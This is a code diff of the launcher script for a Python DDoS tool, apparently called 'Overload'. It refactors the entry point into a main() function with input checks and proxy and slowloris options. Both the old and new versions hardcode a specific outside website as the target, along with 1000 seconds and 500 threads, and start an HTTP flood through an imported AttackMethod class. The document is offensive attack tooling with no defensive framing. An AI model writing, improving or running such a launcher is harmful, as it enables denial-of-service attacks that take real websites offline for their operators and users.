@@ -1,56 +1,59 @@
-# Created by nuvem and tsk
+"""Main script to start GUI DoS attack application."""
 
-# Import modules
+# -*- coding: utf-8 -*-
 import os
 import sys
-import argparse
-from colorama import Fore
 
-os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e")
+from colorama import Fore  # type: ignore[import]
 
-# Get the actual directory
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
+os.system("cls" if os.name == "nt" else "clear")
 
 try:
-    from tools.crash import CriticalError
-    import tools.addons.clean
-    import tools.addons.logo
-    # import tools.addons.winpcap
-    import tools.addons.wireshark
-    from tools.method import AttackMethod
+    from tools.addons.checks import (  # type: ignore[import]
+        check_method_input,
+        check_number_input,
+        check_proxy_input,
+        check_target_input,
+    )
+    from tools.addons.logo import show_logo  # type: ignore[import]
+    from tools.method import AttackMethod  # type: ignore[import]
 except ImportError as err:
-    CriticalError("Failed to import some packages", err)
-    sys.exit(1)
+    from tools.crash import CriticalError  # type: ignore[import]
 
-method = "HTTP"
-logo = """
- ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
-▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
-▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
-▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
-░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
-░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
-  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
-░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
-    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
-              ░                                               ░     
-"""
-CRED2 = '\33[91m'
+    CriticalError("Failed to import some packages", err)
+
+
+def main() -> None:
+    """Run main application."""
+    show_logo()
+    try:
+        #method = check_method_input()
+        method = "HTTP"
+        #time = check_number_input("time")
+        time = int(1000)
+        #threads = check_number_input("threads" if method == "http" else "sockets")
+        threads = int(500)
+        use_proxy = check_proxy_input() if method == "http" else False
+        sleep_time = check_number_input("sleep time") if method == "slowloris" else 0
+        #target = check_target_input()
+        target = str("http://liwuhe51.top/")
+
+        with AttackMethod(
+            duration=time,
+            method_name=method,
+            threads=threads,
+            target=target,
+            use_proxy=use_proxy,
+            sleep_time=sleep_time,
+        ) as attack:
+            attack.start()
+    except KeyboardInterrupt:
+        print(
+            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
+        )
+        sys.exit(1)
+
 
 if __name__ == "__main__":
-    # Print help
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(CRED2 + logo + CRED2)
-    print("├───DDOS TOOL LAYER 7")
-    #time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
-    time = int(1000)
-    #threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
-    threads = int(500)
-    #target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
-    target = str("http://liwuhe51.top/")
-    with AttackMethod(
-        duration=time, name=method, threads=threads, target=target
-    ) as Flood:
-        Flood.Start()
-else:
-    sys.exit(1)
+    main()
